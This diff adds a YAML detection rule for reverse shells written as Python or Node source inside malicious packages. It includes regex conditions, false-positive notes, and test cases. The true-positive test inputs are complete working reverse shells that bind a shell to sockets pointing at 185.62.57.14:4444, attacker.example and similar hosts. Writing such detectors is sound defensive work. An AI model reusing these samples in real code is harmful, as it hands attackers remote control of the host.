@@ -1,0 +1,202 @@
+title: "Reverse Shell Assembled In-Source (socket bound to an interactive shell)"
+id: ATR-2026-02600
+rule_version: 1
+status: "experimental"
+description: >
+  Detects a reverse shell written as SOURCE CODE rather than as a shell one-liner:
+  an outbound socket is opened to a raw host/port, the process's standard file
+  descriptors are rebound onto that socket (or piped bidirectionally into a child),
+  and an INTERACTIVE shell is handed the result. This is the form malicious PyPI /
+  npm packages ship in (OSSF MAL-2025-191647 mcp-runcommand-server and siblings),
+  and it is exactly the form ATR-2026-00121 cannot see: 00121's reverse-shell
+  condition is written as `python[3]?\s+-c\s+['"]import\s+(socket|os)` plus
+  `bash -i >& /dev/tcp/` and `nc -e`, i.e. CLI invocations only. A package whose
+  __init__.py contains the same behaviour never matches.
+
+  WHY THREE CONDITIONS, ALL REQUIRED. Every single element is common in
+  legitimate code. `socket.connect` is every HTTP client. `os.dup2(f.fileno(), 1)`
+  is every daemoniser and every log-redirecting supervisor. `spawn('/bin/sh', ...)`
+  is every build script. Measured against hand-written benign twins, four of them
+  matched two of the three conditions -- a node log shipper
+  (net.connect + client.pipe(tailer.stdin) + spawn('/bin/sh', ['-c', 'tail -F ...'])),
+  a python journal shipper (socket.connect + os.dup2(s.fileno(), 1) +
+  subprocess.call(['/bin/sh','-c','journalctl -f'])), a CI runner and a TCP relay.
+  Those are the shapes this rule has to survive, and the reason condition 3 does
+  not accept a shell that is given a `-c` command: shipping the output of a NAMED
+  command over a socket is ordinary operations; handing over a shell with no
+  command, or with `-i`, or through pty.spawn, is not.
+
+  DELIBERATELY NOT COVERED. Listening (bind/listen) shells are excluded --
+  condition 1 requires an outbound connect, because web-terminal backends
+  (ttyd/gotty/xterm.js, pty.fork + execvp('/bin/bash')) are the benign twin of a
+  bind shell and are indistinguishable at the pattern layer. No C2 address, port
+  or package name is hardcoded; the shape is the signal.
+author: "ATR Community"
+date: "2026/08/23"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: "test"
+severity: critical
+
+references:
+  owasp_llm:
+    - "LLM03:2025"
+  owasp_agentic:
+    - "ASI05:2026"
+  mitre_atlas:
+    - "AML.T0010 - AI Supply Chain Compromise"
+    - "AML.T0011 - User Execution"
+  cve:
+    - "MAL-2025-191647"
+
+compliance:
+  owasp_agentic:
+    - id: ASI05:2026
+      context: "A dependency or skill an agent loads opens an attacker-controlled channel and hands over an interactive shell, which is unbounded remote control of the agent host."
+      strength: primary
+  owasp_llm:
+    - id: LLM03:2025
+      context: "Supply-chain compromise detection: the reverse shell arrives inside a package the agent installed or a skill it loaded, not through the prompt."
+      strength: primary
+  eu_ai_act:
+    - article: "15"
+      context: "Article 15 requires accuracy, robustness and cybersecurity for high-risk systems; an interactive shell bound to an external socket is total loss of control over the system, and this rule is the detection control for it."
+      strength: primary
+    - article: "9"
+      context: "Malicious dependency execution is a documented risk class for agent runtimes; detection events from this rule are the monitoring evidence Article 9 risk management requires."
+      strength: secondary
+    - article: "12"
+      context: "Article 12 logging: a match records the exact source text that established the channel, which is the record an incident reconstruction needs."
+      strength: secondary
+  nist_ai_rmf:
+    - function: Manage
+      subcategory: MG.2.3
+      context: "Runtime treatment for third-party component risk: the component under evaluation contains remote-control code."
+      strength: primary
+    - function: Map
+      subcategory: MP.5.1
+      context: "Catalogues in-source reverse shells as a distinct supply-chain risk from shell-command reverse shells, which existing coverage already addresses."
+      strength: secondary
+    - function: Measure
+      subcategory: "MS.2.7"
+      context: "Detection events supply the security and resilience measurement MEASURE 2.7 asks to be documented for agent dependencies."
+      strength: secondary
+  iso_42001:
+    - clause: "8.1"
+      context: "Clause 8.1 control of externally provided processes and products: a package that opens a shell to an external host is an externally provided process operating outside any defined boundary."
+      strength: primary
+    - clause: "6.2"
+      context: "Detecting remote-control code in loaded components is an AIMS information security objective under clause 6.2, operationalised as a runtime control."
+      strength: secondary
+    - clause: "8.4"
+      context: "Impact assessment under 8.4 must account for third-party components; these events are the monitoring evidence for the component-compromise path."
+      strength: secondary
+
+tags:
+  category: skill-compromise
+  subcategory: reverse-shell
+  scan_target: both
+  confidence: high
+  suppress_in_code_blocks: true
+
+agent_source:
+  type: mcp_exchange
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  conditions:
+    # 1 -- OUTBOUND socket to a raw host/port. bind/listen deliberately excluded.
+    - field: content
+      operator: regex
+      value: '(?:\bsocket\.socket\s*\(\s*(?:socket\.)?AF_INET[\s\S]{0,120}?\.connect\s*\(|\.connect\s*\(\s*\(\s*["''][\w.\-]{1,60}["'']\s*,\s*\d{1,5}\s*\)|\bnet\.(?:connect|createConnection)\s*\(\s*\d{1,5}\s*,|new\s+net\.Socket\s*\([\s\S]{0,80}\.connect\s*\(\s*\d{1,5})'
+      description: "Outbound socket opened to a literal host and port (python socket / node net)"
+
+    # 2 -- Standard file descriptors rebound onto that channel, or piped into a child's stdin.
+    - field: content
+      operator: regex
+      value: '(?:\bdup2\s*\(\s*[\w.\[\]()]{1,24}\.fileno\s*\(\s*\)\s*,\s*[0-2]\s*\)|\.pipe\s*\(\s*[\w.$]{1,24}\.stdin\s*\)|\bstdin\s*=\s*[\w.$]{1,24}\.fileno\s*\(\s*\))'
+      description: "Process stdio rebound onto a socket descriptor, or bidirectional pipe into a child's stdin"
+
+    # 3 -- An INTERACTIVE shell (no command argument, or -i, or a pty) is handed over.
+    #      A shell invoked with -c <named command> is ordinary operations and is excluded.
+    - field: content
+      operator: regex
+      value: '(?:\bpty\.spawn\s*\(|\bsubprocess\.(?:call|run|Popen|check_call)\s*\(\s*\[\s*["'']/bin/(?:sh|bash|zsh|dash|ash)["'']\s*(?:,\s*["'']-i["'']\s*)?\]|\bos\.exec(?:l|v|le|ve|lp|vp|lpe|vpe)?\s*\(\s*["'']/bin/(?:sh|bash|zsh|dash)["'']|\b(?:spawn|execFile)\s*\(\s*["''](?:/bin/)?(?:sh|bash|zsh|dash)["'']\s*(?:\)|,\s*\[\s*\]))'
+      description: "Interactive shell handover: no command argument, an explicit -i, or pty.spawn"
+
+  condition: all
+  false_positives:
+    - "Security research, malware write-ups and detection-engineering notes that quote a complete reverse-shell source listing verbatim. The rule cannot distinguish a payload from a payload being explained, and does not try; triage the surrounding context"
+    - "Purpose-built remote administration or remote-shell tooling (an SSH-alternative, a jump-host agent) whose whole job is this shape. Legitimate by intent, identical by structure"
+    - "Exploit-development, GTFOBins-style and CTF material stored in a repository the agent reads. Measured on the benign corpus: a penetration-testing skill document quoting the canonical python reverse shell fired this rule until tags.suppress_in_code_blocks was set, which drops matches that occur inside a fenced code block. Payloads arriving as an actual file body or tool argument are not fenced and are unaffected"
+
+response:
+  actions:
+    - alert
+    - snapshot
+    - escalate
+  auto_response_threshold: critical
+  message_template: >
+    [ATR-2026-02600] Source code detected that opens an outbound socket, rebinds
+    the process's standard descriptors onto it, and hands over an interactive
+    shell -- a reverse shell in library form rather than as a shell command.
+    Treat the containing package, skill or file as compromised until reviewed.
+
+confidence: 85
+test_cases:
+  true_positives:
+    - input: "import socket,os,subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"185.62.57.14\",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call([\"/bin/sh\",\"-i\"])"
+      expected: triggered
+      description: "Canonical python reverse shell as package source (MAL-2025-191647 shape)"
+    - input: "import socket,os,pty\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"10.11.12.13\",9001))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn(\"/bin/bash\")"
+      expected: triggered
+      description: "pty.spawn variant -- upgrades the shell to a full terminal"
+    - input: "const net=require('net');const cp=require('child_process');\nconst sh=cp.spawn('/bin/sh',[]);\nconst client=new net.Socket();\nclient.connect(4444,'10.0.0.9',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});"
+      expected: triggered
+      description: "Node reverse shell: bidirectional pipe between socket and a shell with no command"
+    - input: "const net=require('net');\nconst sh=require('child_process').spawn('/bin/bash');\nnet.connect(1337,'attacker.example',function(){this.pipe(sh.stdin);sh.stdout.pipe(this);});"
+      expected: triggered
+      description: "Node net.connect form, shell spawned with no argument list"
+    - input: "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"1.2.3.4\",8080))\nos.dup2(s.fileno(),0)\nos.execve(\"/bin/sh\",[\"/bin/sh\"],{})"
+      expected: triggered
+      description: "exec-family handover after descriptor rebinding"
+  true_negatives:
+    - input: "import os, subprocess\nwith open(os.devnull, 'rb') as devnull:\n    os.dup2(devnull.fileno(), 0)\n    os.dup2(devnull.fileno(), 1)\nsubprocess.call(['/bin/sh', '-c', 'systemctl reload nginx'])"
+      expected: not_triggered
+      description: "Ordinary daemonisation: descriptors rebound onto /dev/null, shell given a named command, no socket"
+    - input: "const net = require('net');\nconst cp = require('child_process');\nconst client = net.connect(514, 'syslog.internal.example');\nconst tailer = cp.spawn('/bin/sh', ['-c', 'tail -F /var/log/app.log']);\ntailer.stdout.pipe(client);\nclient.pipe(tailer.stdin);"
+      expected: not_triggered
+      description: "Log shipper -- socket plus bidirectional pipe plus a shell, separated from the attack only by the -c command. The hardest twin measured"
+    - input: "import socket, os, subprocess\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"collector.internal.example\", 5140))\nos.dup2(s.fileno(), 1)\nsubprocess.call([\"/bin/sh\", \"-c\", \"journalctl -f -u app\"])"
+      expected: not_triggered
+      description: "Journal shipped over a socket via dup2 -- two of three conditions match, the shell carries a command"
+    - input: "const net = require('net');\nconst { spawn } = require('child_process');\nconst conn = net.createConnection(7000, 'runner.internal.example');\nconst job = spawn('/bin/bash', ['-lc', 'npm ci && npm test']);\njob.stdout.pipe(conn);\nconn.pipe(job.stdin);"
+      expected: not_triggered
+      description: "CI runner streaming a build over a control socket"
+    - input: "import pty, os, socket\nsrv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsrv.bind((\"0.0.0.0\", 8022))\nsrv.listen(5)\npid, fd = pty.fork()\nif pid == 0:\n    os.execvp('/bin/bash', ['/bin/bash'])"
+      expected: not_triggered
+      description: "Web-terminal backend -- listens rather than connects, which is why condition 1 requires an outbound connect"
+    - input: "import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"api.example.com\", 443))\ns.sendall(b\"GET /health HTTP/1.1\\r\\nHost: api.example.com\\r\\n\\r\\n\")\nprint(s.recv(4096))"
+      expected: not_triggered
+      description: "Plain socket HTTP client"
+    - input: "log = open('/var/log/worker.log', 'ab')\nos.dup2(log.fileno(), 1)\nos.dup2(log.fileno(), 2)\nsubprocess.Popen(['/bin/bash', '-c', 'exec ./worker --config /etc/worker.yml'])"
+      expected: not_triggered
+      description: "Supervisor redirecting a worker's output to a log file"
+    - input: "To run a shell command from Python use subprocess.run(['/bin/sh', '-c', 'echo hello']). Redirect stdin with os.dup2(f.fileno(), 0) if you need the child to read from a file."
+      expected: not_triggered
+      description: "Library documentation naming both primitives"
+    - input: "The pty module can drive an interactive program: pty.spawn('/bin/bash') replaces the current process image with a shell attached to a pseudo-terminal. Use socket.socket(socket.AF_INET, socket.SOCK_STREAM) separately if you also need networking."
+      expected: not_triggered
+      description: "Tutorial prose naming pty.spawn and AF_INET sockets in the same paragraph"
+    - input: "import socket, paramiko\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('bastion.corp.example', 22))\nt = paramiko.Transport(sock)\nchan = t.open_session()\nchan.exec_command('/bin/sh -c uptime')"
+      expected: not_triggered
+      description: "Paramiko SSH client running a remote command over its own transport"
+    - input: "If you suspect a reverse shell, check for outbound connections with ss -tnp and look for a process whose stdin, stdout and stderr all point at the same socket inode. Kill it and rotate credentials."
+      expected: not_triggered
+      description: "Incident-response runbook describing the attack in prose"
+    - input: "const net = require('net');\nconst client = net.connect(9200, 'logs.internal.example');\nprocess.stdin.pipe(client);\nclient.pipe(process.stdout);"
+      expected: not_triggered
+      description: "Stream relay with no child process at all"
